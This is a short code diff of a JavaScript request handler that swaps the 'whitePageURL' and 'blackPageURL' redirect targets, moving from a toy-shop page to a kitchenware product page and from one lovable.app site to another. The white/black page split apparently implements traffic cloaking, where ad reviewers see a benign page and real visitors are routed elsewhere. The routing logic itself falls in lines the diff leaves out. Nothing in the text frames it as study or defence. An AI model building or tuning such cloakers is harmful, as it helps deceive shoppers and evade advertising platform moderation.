@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.houseofkids.com/activity-toy-peluche.html";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://frenchbeautyco.com.au/products/silicone-meal-set";
+    const blackPageURL = "https://casssshlov.lovable.app/";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
